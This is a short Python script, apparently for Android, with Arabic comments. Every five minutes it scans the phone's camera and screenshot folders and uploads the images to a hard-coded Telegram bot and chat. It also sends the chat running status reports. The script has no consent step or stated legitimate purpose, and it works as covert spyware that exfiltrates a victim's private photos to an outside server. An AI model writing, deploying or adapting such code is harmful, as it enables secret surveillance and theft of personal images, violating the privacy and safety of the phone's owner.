import os
import time
import requests

BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

# مجلدات الفحص
WATCH_FOLDERS = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots"
]

def send_debug(msg):
    # دالة ترسل لنا تقرير الأخطاء فوراً على البوت
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": f"🔍 DEBUG: {msg}"})
    except: pass

def send_file_final(path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        if not os.path.exists(path):
            send_debug(f"❌ الملف غير موجود: {path}")
            return False

        with open(path, "rb") as f:
            r = requests.post(
                url,
                data={"chat_id": CHAT_ID},
                files={"document": f},
                timeout=60
            )
        
        if r.status_code != 200:
            send_debug(f"⚠️ رفض تليجرام: {r.text}")
            return False
        return True
    except Exception as e:
        send_debug(f"🔥 خطأ برمجي: {str(e)}")
        return False

def scan():
    send_debug("جاري فحص المجلدات...")
    found_files = False
    for folder in WATCH_FOLDERS:
        if os.path.exists(folder):
            files = [os.path.join(folder, f) for f in os.listdir(folder) 
                     if f.lower().endswith((".jpg", ".png", ".jpeg"))]
            if files:
                found_files = True
                send_debug(f"✅ وجدت {len(files)} ملفات في {folder}. سأبدأ الإرسال...")
                for img in files[:5]: # نجرب أول 5 فقط
                    send_file_final(img)
                    time.sleep(5)
        else:
            send_debug(f"❓ المجلد غير موجود: {folder}")
            
    if not found_files:
        send_debug("🚫 لم أجد أي صور في المسارات المحددة.")

def main():
    send_debug("🚀 بدأت الخدمة.. انتظر الفحص...")
    while True:
        scan()
        time.sleep(300)

if __name__ == "__main__":
    main()
